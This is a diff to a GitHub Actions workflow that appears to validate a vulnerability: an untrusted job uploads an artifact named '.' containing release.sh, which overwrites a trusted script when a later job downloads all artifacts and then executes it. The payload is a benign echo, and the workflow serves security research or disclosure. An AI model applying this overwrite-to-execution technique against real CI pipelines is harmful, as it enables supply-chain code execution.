@@ -1,6 +1,6 @@
-name: actions artifact dot overwrite validation
+name: actions artifact dot consumer execution validation
 
-run-name: actions artifact dot overwrite validation ${{ github.run_id }}
+run-name: actions artifact dot consumer execution validation ${{ github.run_id }}
 
 on:
   push:
@@ -13,22 +13,20 @@ permissions:
   actions: read
 
 jobs:
-  validate-dot-artifact-overwrite:
+  untrusted-producer:
     runs-on: ubuntu-latest
     steps:
-      - name: Prepare payload files
+      - name: Create attacker controlled artifact payload
         run: |
           set -euo pipefail
-          rm -rf payload-dot payload-safe sandbox
-          mkdir -p payload-dot payload-safe sandbox/inner
-          printf 'ATTACKER-CONTROLLED-%s\n' "$GITHUB_RUN_ID" > payload-dot/release.sh
+          rm -rf payload-dot payload-safe
+          mkdir -p payload-dot payload-safe
+          cat > payload-dot/release.sh <<'SH'
+          echo "ATTACKER-CODE-RAN-IN-CONSUMER-JOB-${GITHUB_RUN_ID}"
+          SH
           printf 'safe-%s\n' "$GITHUB_RUN_ID" > payload-safe/safe.txt
-          printf 'TRUSTED-BEFORE-DOWNLOAD\n' > sandbox/inner/release.sh
-          chmod +x sandbox/inner/release.sh
-          echo '--- before download ---'
-          sed -n '1p' sandbox/inner/release.sh
 
-      - name: Upload crafted dot artifact containing colliding root file
+      - name: Upload crafted dot artifact containing colliding root script
         uses: actions/upload-artifact@v7.0.1
         with:
           name: .
@@ -42,19 +40,34 @@ jobs:
           path: payload-safe/safe.txt
           retention-days: 1
 
-      - name: Download all artifacts into a directory that already has a trusted file
+  trusted-consumer:
+    needs: untrusted-producer
+    runs-on: ubuntu-latest
+    steps:
+      - name: Prepare trusted consumer staging directory
+        run: |
+          set -euo pipefail
+          rm -rf sandbox
+          mkdir -p sandbox/inner
+          cat > sandbox/inner/release.sh <<'SH'
+          echo "TRUSTED-CONSUMER-SCRIPT-BEFORE-DOWNLOAD"
+          SH
+          chmod +x sandbox/inner/release.sh
+          echo '--- before download ---'
+          bash sandbox/inner/release.sh
+
+      - name: Download all artifacts into trusted staging directory
         uses: actions/download-artifact@v8.0.1
         with:
           path: sandbox/inner
 
-      - name: Validate trusted root file was overwritten by dot artifact
+      - name: Execute trusted consumer script after artifact download
         run: |
           set -euo pipefail
           echo '--- filesystem result ---'
           find sandbox -maxdepth 4 -type f -print -exec sed -n '1p' {} \;
-          echo '--- overwritten file content ---'
-          sed -n '1p' sandbox/inner/release.sh
-          echo '--- assertions ---'
-          grep -q "ATTACKER-CONTROLLED-$GITHUB_RUN_ID" sandbox/inner/release.sh
+          echo '--- executing root script after download ---'
+          bash sandbox/inner/release.sh | tee execution-output.txt
+          grep -q "ATTACKER-CODE-RAN-IN-CONSUMER-JOB-$GITHUB_RUN_ID" execution-output.txt
           test -f sandbox/inner/safe-artifact/safe.txt
-          echo 'dot artifact overwrote a pre-existing trusted file in the requested download root'
+          echo 'dot artifact overwrote and controlled the script executed by the consumer job'
